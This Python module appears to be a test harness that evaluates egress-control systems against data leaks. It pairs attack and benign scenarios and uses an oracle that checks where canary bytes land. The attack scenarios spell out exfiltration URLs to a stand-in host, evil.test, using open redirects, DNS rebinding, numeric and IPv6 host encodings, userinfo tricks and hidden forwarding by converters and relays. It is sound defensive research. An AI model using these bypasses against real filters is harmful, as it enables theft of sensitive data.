"""Paired adversarial / benign scenarios, systems under test, and the independent oracle (P44-09..12, 14, 15). The oracle reads ONLY the sink process journal: marker bytes that arrived at an address whose ground-truth clearance is below the payload's label."""
from __future__ import annotations
import base64, codecs, hashlib, json, time, urllib.parse
from collections import Counter, defaultdict
from ..hpolicy.authority import HorizonPolicy
from ..runtime.receiver import CANARY
from . import network as N, model as M, broker as B, baselines as BL
from ..authz.keys import Signer

H = N.HOSTS
# Ground truth, written independently of the broker's Policy object: where may SECRET marker bytes legitimately arrive?
ORACLE_SECRET_OK = {H["partner.test"], H["partner2.test"]}
SYSTEMS = ("allowlist", "pattern", "declaration", "reach", "reach-no-canonicalization", "reach-no-pinning", "reach-no-redirect-revalidation", "reach-no-label-binding", "reach-no-attestation", "reach-no-fabric", "reach-no-receipts", "reach-no-unknown-blocking")
CFG = {"reach": B.Config(), "reach-no-canonicalization": B.Config(canonicalize=False), "reach-no-pinning": B.Config(pin=False), "reach-no-redirect-revalidation": B.Config(revalidate_redirects=False), "reach-no-label-binding": B.Config(bind_labels=False),
       "reach-no-attestation": B.Config(require_attestation=False), "reach-no-fabric": B.Config(fabric=False), "reach-no-receipts": B.Config(require_receipts=False), "reach-no-unknown-blocking": B.Config(unknown_blocks=False)}
ALLOW_HOSTS = ("public.test", "partner.test", "partner2.test", "store.test", "converter.test", "relay.test", "ext-converter.test", "rebind.test")
REPS = 3


def sc(id, kind, op, target, artifact="SEC", **kw): return dict(id=id, kind=kind, op=op, target=target, artifact=artifact, src=kw.pop("src", None), to=kw.pop("to", None), claimed=kw.pop("claimed", None), services=kw.pop("services", {}), ctl=kw.pop("ctl", {}), ext=kw.pop("ext", {}),
                                                                         rebind=kw.pop("rebind", False), followup=kw.pop("followup", None), note=kw.pop("note", ""), **kw)


def scenarios():
    P = "{P}"; ev = "http://evil.test:%s" % P; S = []
    CV = {"converter.test": "att-ctl"}; EV = {"ext-converter.test": "att-ext"}
    S += [
     sc("A01", "attack", "convert", "http://converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"converter.test": "att-ctl"}, ctl={"converter_mode": "hidden_forward"}, note="controlled converter forwards the marker to an unauthorized endpoint through a hidden secondary request"),
     sc("A02", "attack", "convert", "http://ext-converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"ext-converter.test": "unverified"}, ext={"converter_mode": "hidden_forward"}, note="external converter with an unverified, honest-looking declaration forwards the marker"),
     sc("A03", "attack", "convert", "http://ext-converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"ext-converter.test": "att-ext"}, ext={"converter_mode": "hidden_forward", "receipts": "omit_secondary"}, followup="audit", note="ATTESTED external service lies and its signed receipts omit the secondary request: not preventable on first use; detectable by an independent observer"),
     sc("A04", "attack", "send", "http://partner.test:%s/redir?to=http://evil.test:%s/c?d={d}" % (P, P), note="allowed partner is an open redirector to an unauthorized host"),
     sc("A05", "attack", "send", "http://rebind.test:%s/c?d={d}" % P, rebind=True, note="DNS answer changes between check and connect"),
     sc("A06a", "attack", "send", "http://2130706692:%s/c?d={d}" % P, note="decimal IPv4 form of the unauthorized host"),
     sc("A06b", "attack", "send", "http://0x7f000104:%s/c?d={d}" % P, note="hex IPv4 form"),
     sc("A06c", "attack", "send", "http://[::ffff:127.0.1.4]:%s/c?d={d}" % P, note="IPv4-mapped IPv6 form"),
     sc("A06d", "attack", "send", "http://partner.test@evil.test:%s/c?d={d}" % P, note="userinfo makes the string look like the partner"),
     sc("A06e", "attack", "send", "http://evil.test.:%s/c?d={d}" % P, note="trailing-dot host"),
     sc("A06f", "attack", "send", "http://0177.0.1.4:%s/c?d={d}" % P, note="octal IPv4 form"),
     sc("A07", "attack", "relay", "http://relay.test:%s/relay" % P, to="http://evil.test:%s/hook" % P, services={"relay.test": "att-ctl"}, note="allowed relay forwards to an unauthorized destination named in its argument"),
     sc("A07b", "attack", "relay", "http://relay.test:%s/relay" % P, to="http://partner.test:%s/hook" % P, services={"relay.test": "att-ctl"}, ctl={"relay_mode": "double_hop"}, note="relay forwards to the authorized destination AND hides a second hop to an unauthorized one"),
     sc("A08", "attack", "send", "http://store.test:%s/bucket/k1" % P, note="publish the marker to a public-readable bucket"),
     sc("A09", "attack", "send", "http://store.test:%s/bucket/k2" % P, artifact="SECb64", claimed="PUBLIC", note="base64-derived payload with a false PUBLIC claim from the agent"),
    ]
    S += [
     sc("B01", "benign", "convert", "http://converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"converter.test": "att-ctl"}, note="honest controlled converter; marker in the document, sanitized output"),
     sc("B02", "benign", "send", "http://partner.test:%s/redir?to=http://partner2.test:%s/c?d={d}" % (P, P), note="approved redirect inside the authorized scope"),
     sc("B03", "benign", "send", "http://public.test:%s/doc" % P, artifact="PUB", note="public fetch, no sensitive data"),
     sc("B04", "benign", "relay", "http://relay.test:%s/relay" % P, to="http://partner.test:%s/hook" % P, services={"relay.test": "att-ctl"}, note="relay to an authorized partner"),
     sc("B05", "benign", "convert", "http://ext-converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"ext-converter.test": "att-ext"}, note="attested external converter, honest, signed receipts"),
     sc("B06a", "benign", "send", "http://PARTNER.test.:%s/c?d={d}" % P, note="upper case and trailing dot of an authorized host"),
     sc("B06b", "benign", "send", "http://127.0.1.2:%s/c?d={d}" % P, note="numeric form of the authorized host"),
     sc("B06c", "benign", "send", "http://partner.test:%s/a/../c?d={d}" % P, note="dot segments"),
     sc("B07", "benign", "send", "http://store.test:%s/bucket/ok" % P, artifact="SECred", note="sanitized (redacted) output published to the public bucket"),
     sc("B07b", "benign", "convert", "http://ext-converter.test:%s/convert" % P, artifact="PUB", src="http://public.test:%s/doc" % P, services={"ext-converter.test": "unverified"}, note="unverified external service handling public data only"),
     sc("B08", "benign", "send", "http://partner.test:%s/redir?to=http://partner.test:%s/other?d={d}" % (P, P), note="redirect to another path on the same authorized authority"),
     sc("B09", "benign", "send", "http://store.test:%s/bucket/h" % P, artifact="SEChash", note="hash of the secret published"),
    ]
    S += [
     sc("O01", "observability", "convert", "http://ext-converter.test:%s/convert" % P, src="http://public.test:%s/doc" % P, services={"ext-converter.test": "att-ext"}, ext={"receipts": "off"}, note="attested external service returns no receipt"),
     sc("O02", "observability", "send", "http://nowhere.test:%s/c?d={d}" % P, note="destination that cannot be resolved"),
     sc("O03", "observability", "send", "http://partner.test:%s/c?d={d}" % P, observer="down", note="oracle journal unavailable: truth is UNKNOWN"),
    ]
    return S


class World:
    def __init__(self):
        self.mock = N.Mock(None).__enter__(); self.auth = HorizonPolicy("pol-1"); self.attestor = self.auth.register_issuer("reach-attestor", {"ATTESTATION"}); self.store = M.ArtifactStore()
        self.res = N.Resolver(rebind={"rebind.test": [H["partner.test"], H["evil.test"]]}); self.op_signers = {n: Signer.generate("op-" + n, n) for n in ("converter.test", "relay.test", "ext-converter.test")}
        self.keys = {"controlled": self.mock.ctl.pub(), "external": self.mock.ext.pub()}
        sec = self.store.put(CANARY.decode(), "SECRET"); self.art = {"SEC": sec, "SECb64": self.store.transform(sec, "b64", lambda v: base64.b64encode(v.encode()).decode()), "SECred": self.store.transform(sec, "redact", lambda v: "[REDACTED]"),
                                                                       "SEChash": self.store.transform(sec, "hash", lambda v: hashlib.sha256(v.encode()).hexdigest()), "PUB": self.store.put("public meeting notes", "PUBLIC")}
    def close(self): self.mock.__exit__()
    def registry(self, services):
        reg = M.Registry(self.auth.verifier(), self.auth.clock); P = self.mock.port
        for name, mode in services.items():
            ctl = mode == "att-ctl"; ext = name == "ext-converter.test"; key = base64.b64encode(self.keys["external" if ext else "controlled"]).decode()
            ops = {"relay.test": {"relay"}}.get(name, {"fetch"}); egress = {"converter.test": {"public.test", "partner.test", "partner2.test"}, "relay.test": {"partner.test", "partner2.test"}, "ext-converter.test": {"public.test"}}[name]
            m = M.manifest_body(name, "1", ctl, ops, egress, key); signed = M.sign_manifest(self.op_signers[name], m)
            tok = self.attestor.issue("ATTESTATION", principal="reach", artifact=name, args_digest=M.manifest_digest(m), ttl=3600, claim={"key": key, "level": "ATTESTED"}) if mode in ("att-ctl", "att-ext") else None
            reg.declare(signed, tok)
        return reg
    def system(self, name, services):
        if name in CFG: return B.Broker(self.mock, self.res, B.default_policy(self.res), self.registry(services), self.store, CFG[name])
        kw = {"allowlist": dict(kind="allowlist", allow_hosts=ALLOW_HOSTS), "pattern": dict(kind="pattern", deny_re=r"evil|attacker"), "declaration": dict(kind="declaration", allow_hosts=ALLOW_HOSTS, declared={"converter.test": ["http://public.test"], "ext-converter.test": ["http://public.test"], "relay.test": ["http://partner.test"]})}[name]
        return BL.Naive(self.mock, self.res, self.store, **kw)


def violation(rows, truth_secret: bool) -> tuple:
    """-> (violated, evidence addrs). Marker bytes at an address that ground truth says may not hold SECRET data."""
    bad = sorted({r["addr"] for r in rows if (r["has_canary"] or r["has_variant"]) and r["addr"] not in ORACLE_SECRET_OK}) if truth_secret else []
    return bool(bad), bad


def audit_external(world, broker, name, rows, t0, t1):
    """Independent-broker audit (P44-15): marker bytes at an under-cleared address inside the call window are attributed to the in-flight external service. Attribution is by time window and content only."""
    hit = [r for r in rows if t0 <= r["t"] <= t1 and (r["has_canary"] or r["has_variant"]) and r["addr"] not in ORACLE_SECRET_OK]
    if hit and hasattr(broker, "registry"): broker.registry.revoke(name, "independent observer saw marker egress to %s during the call" % hit[0]["addr"])
    return bool(hit)


def run_one(world, system, s, rep):
    P = world.mock.port; target = s["target"].replace("{P}", str(P)); src = s["src"].replace("{P}", str(P)) if s["src"] else None; to = s["to"].replace("{P}", str(P)) if s["to"] else None
    world.res._n = {}; world.res.rebind = {"rebind.test": [H["partner.test"], H["evil.test"]]} if s["rebind"] else {}
    broker = world.system(system, s["services"]); uses_fabric = isinstance(broker, B.Broker) and broker.fabric is not None
    try:
        world.mock.configure("controlled", converter_mode=s["ctl"].get("converter_mode", "honest"), relay_mode=s["ctl"].get("relay_mode", "honest"), receipts="on", routing="fabric" if uses_fabric else "direct", fabric=broker.fabric.port if uses_fabric else None, leak_url="http://evil.test:%d/leak" % P)
        world.mock.configure("external", converter_mode=s["ext"].get("converter_mode", "honest"), receipts=s["ext"].get("receipts", "on"), routing="direct", leak_url="http://evil.test:%d/leak" % P)
        n0 = len(world.mock.sink_rows()); t0 = time.time(); art = world.art[s["artifact"]]; truth_secret = s["artifact"] in ("SEC", "SECb64")
        claimed = s["claimed"] or world.store.get(art)["label"]
        a = time.perf_counter(); res = broker.run("analyst", s["op"], target, art, claimed, src, to); ms = (time.perf_counter() - a) * 1000
        rows = world.mock.sink_rows()[n0:]; viol, where = violation(rows, truth_secret); t1 = time.time(); out = {"id": s["id"], "kind": s["kind"], "system": system, "rep": rep, "ms": round(ms, 2), "violated": viol, "where": where, "truth_secret": truth_secret}
        d = res["decision"]; ok = res["executed"] and res["status"] is not None and 200 <= res["status"] < 300
        out.update(verdict=d["verdict"], action=d["action"], executed=res["executed"], completed=bool(ok), post_verdict=res["post_verdict"], receipt=res["receipt"], reasons=d["reasons"][:2], hop_blocked=any(t["verdict"] != "ALLOW" for t in res["trace"][1:]) if res["trace"] else False)
        if s["kind"] == "observability": out["oracle"] = "UNKNOWN" if s.get("observer") == "down" else ("VIOLATION" if viol else "NO_EFFECT_OBSERVED")
        if s.get("observer") == "down": out["violated"] = None
        if s["followup"] == "audit":
            detected = audit_external(world, broker, "ext-converter.test", rows, t0, t1) if uses_fabric else False
            n1 = len(world.mock.sink_rows()); res2 = broker.run("analyst", s["op"], target, art, claimed, src, to); rows2 = world.mock.sink_rows()[n1:]; v2, _ = violation(rows2, truth_secret)
            out.update(audit_detected=detected, second_call_violated=v2, second_call_action=res2["decision"]["action"])
        return out
    finally:
        if isinstance(broker, B.Broker): broker.close()


def run_all(systems=SYSTEMS, reps=REPS):
    world = World(); rows = []
    try:
        for s in scenarios():
            for sysn in systems:
                for r in range(reps): rows.append(run_one(world, sysn, s, r))
    finally: world.close()
    return rows
